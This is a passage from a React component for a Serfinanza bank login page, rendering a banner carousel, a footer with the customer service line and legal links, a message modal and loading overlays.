                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>

          {/* Se renderiza la columna derecha con carrusel */}
          <div className="carousel-section">
            <Swiper
              modules={[Pagination, Autoplay]}
              pagination={{ clickable: true }}
              autoplay={{ delay: 4000, disableOnInteraction: false }}
              loop={false}
              rewind
              slidesPerView={1}
              className="swiper hero-swiper"
            >
              <SwiperSlide>
                <img src={banner3} alt="App Serfinanza" />
              </SwiperSlide>
              <SwiperSlide>
                <img src={banner1} alt="Protege tu clave" />
              </SwiperSlide>
              <SwiperSlide>
                <img src={banner2} alt="Ser precavido" />
              </SwiperSlide>
            </Swiper>
          </div>
        </div>
        <br />
        <br />
        {/* Se renderiza el footer */}
        <footer className="site-footer">
          <div className="footer-inner">
            <p className="service-line">
              Línea de Servicio al Cliente: 323 5997000 - 018000510513
            </p>

            <div className="footer-row">
              <ul className="legal-links">
                <li>
                  <button type="button" className="legal-link-btn">
                    <svg
                      className="link-icon"
                      viewBox="0 0 24 24"
                      fill="#170C84"
                      aria-hidden
                    >
                      <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                    </svg>
                    Seguridad
                  </button>
                </li>
                <li>
                  <button type="button" className="legal-link-btn">
                    <svg
                      className="link-icon"
                      viewBox="0 0 24 24"
                      fill="#170C84"
                      aria-hidden
                    >
                      <path d="M4 14h4v-4H4v4zm0 5h4v-4H4v4zM4 9h4V5H4v4zm5 5h12v-4H9v4zm0 5h12v-4H9v4zM9 5v4h12V5H9z" />
                    </svg>
                    Reglamento Sucursal Virtual
                  </button>
                </li>
                <li>
                  <button type="button" className="legal-link-btn">
                    <svg
                      className="link-icon"
                      viewBox="0 0 24 24"
                      fill="#170C84"
                      aria-hidden
                    >
                      <path d="M19 3h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm2 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z" />
                    </svg>
                    Políticas de Privacidad
                  </button>
                </li>
              </ul>
              <span className="copy-text">Serfinanza © 2026</span>
            </div>
          </div>
        </footer>
      </main>

      {/* Se renderiza el modal de mensajes */}
      {showModal && (
        <div className="modal-wrap" onClick={closeModal}>
          <div className="modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="modal-top">Personas</div>
            <div className="modal-mid">
              <span className="warn-icon" aria-hidden>
                <svg viewBox="0 0 24 24" focusable="false">
                  <path d="M4.47 20.5h15.06c1.54 0 2.5-1.67 1.73-3L13.73 4.44c-.77-1.33-2.69-1.33-3.46 0L2.74 17.5c-.77 1.33.19 3 1.73 3z" />
                </svg>
                <span className="warn-icon-mark" aria-hidden>
                  <span className="warn-icon-bar" />
                  <span className="warn-icon-dot" />
                </span>
              </span>
              <p>{modalText}</p>
            </div>
            <div className="modal-bot">
              <button
                type="button"
                className="modal-accept-btn"
                onClick={closeModal}
              >
                Aceptar
              </button>
            </div>
          </div>
        </div>
      )}

      {stepTransitionLoading ? (
        <LoadingSerfinanza isOpen once onComplete={finishStepTransition} />
      ) : null}

      {getLoading ? <LoadingSerfinanza isOpen /> : null}
    </div>
  );
};

// Se exporta el componente
export default SerfinanzaLogin;